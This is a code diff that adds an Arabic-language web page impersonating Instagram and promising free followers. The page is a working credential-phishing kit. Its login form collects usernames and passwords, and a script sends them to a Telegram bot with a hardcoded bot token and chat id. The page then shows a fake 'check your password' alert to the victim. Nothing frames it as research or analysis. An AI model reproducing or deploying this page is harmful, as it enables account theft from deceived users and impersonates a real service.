@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>احصل على متابعين انستغرام مجانًا</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --instagram-gradient: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+        }
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+        }
+        .container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .login-container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 350px;
+        }
+        .logo {
+            width: 175px;
+            margin: 0 auto 30px;
+            display: block;
+        }
+        h1 {
+            font-size: 16px;
+            color: #8e8e8e;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        input {
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        button {
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.3s ease;
+        }
+        button:hover {
+            opacity: 0.9;
+        }
+        .instagram-button {
+            background: var(--instagram-gradient);
+        }
+        .features {
+            margin-top: 40px;
+            text-align: center;
+        }
+        .features h2 {
+            font-size: 18px;
+            color: #262626;
+            margin-bottom: 15px;
+        }
+        .features ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        .features li {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 10px;
+        }
+        .features li i {
+            color: #3897f0;
+            margin-left: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">
+            <h1>سجل دخولك للحصول على متابعين مجانيين</h1>
+            <form id="instagramForm">
+                <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف" required>
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+                <button type="submit" class="instagram-button">تسجيل الدخول</button>
+            </form>
+        </div>
+        <div class="features">
+            <h2>لماذا تختارنا للحصول على متابعين؟</h2>
+            <ul>
+                <li><i class="fas fa-check-circle"></i> متابعين حقيقيين ونشطين</li>
+                <li><i class="fas fa-bolt"></i> زيادة سريعة في عدد المتابعين</li>
+                <li><i class="fas fa-lock"></i> آمن وموثوق 100%</li>
+                <li><i class="fas fa-gift"></i> هدايا ومكافآت يومية</li>
+            </ul>
+        </div>
+    </div>
+    <script>
+        const botToken = '7391359985:AAF8wa-mv6ZoIQQ53UDMIRGKdafrc8gG2ik'; // أدخل رمز البوت الخاص بك هنا
+        const chatId = 'imad27'; // أدخل معرف الدردشة هنا
+
+        document.getElementById('instagramForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const message = `اسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+            
+            // إرسال البيانات إلى بوت تلغرام
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('يرجى التحقق من كلمة السر.');
+                } else {
+                    alert('حدث خطأ أثناء إرسال المعلومات.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء إرسال المعلومات.');
+            });
+        });
+    </script>
+</body>
+</html>
